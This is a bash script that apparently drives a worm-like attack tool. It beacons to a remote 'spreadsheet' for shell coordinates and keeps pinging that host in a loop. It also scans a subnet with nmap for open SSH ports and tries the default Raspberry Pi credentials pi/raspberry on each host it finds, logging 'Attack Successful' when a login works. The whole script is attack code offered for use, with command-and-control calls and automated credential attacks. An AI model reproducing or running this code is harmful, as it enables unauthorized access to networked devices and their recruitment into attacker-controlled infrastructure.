#!/bin/bash
RED='\033[0;31m'
LGREY='\033[0;37m'
DIM='\033[0;2m'
BOLD='\033[0;1m'
RBOLD='\033[0;21m'
CLEAR='\033[0;0m'


main() {
	alert "Starting Up"
	source ./credentials.sh
	phone_home &
	scan
	wait
	alert "Goodbye"
}

function ping_home() {
	log "ping home $1 ## $2"
	./ping-home.sh $1 $2
	sleep $?
	ping_home $1 $2
}

function phone_home() {
	# attempt to contact the main spreadsheet and retrieve shell coordinates
	coordinate=$(./phone-home.sh && exit $?)
	case "$?" in 
		0)	log $coordinate
			ping_home $coordinate;;
		1)	log "> Error phoning home";;
	esac
}

function scan() {
	# You can add `--open` to the nmap command to filter on only open 22 port IPs
	command="nmap -p 22 -oG - -sV 10.1.63.0-255 | grep -op 'Host:.*ssh.*'
		| awk '{print \$2}'"
	
	log $command
	target_list=$(eval $command)
	target_list=$'\n' read -rd '' -a y <<<"$target_list"

	for ip in $target_list
	do
		probe $ip
	done
}

function probe() {
	log "Probing $1"
	./probe.sh pi $1 raspberry > /dev/null 2>&1
	case "$?" in 
		0) log "> Attack Successful";;
		1) log "> Network timeout";;
		2) log "> Could not determine password";;
		*) alert "Unknown error occured while probing.  Code: $?";;
	esac
}
	
timestamp() {
	date +"%T"
}	
		
function printMessage() {
	printf "$@\n"
}

function alert() {
	printMessage "${RED}$@${CLEAR}"
}

function log() {
	printMessage "${DIM}${LGREY}# ${BOLD}LOG $(timestamp) |${RBOLD} $@${CLEAR}"
}

main "$@"

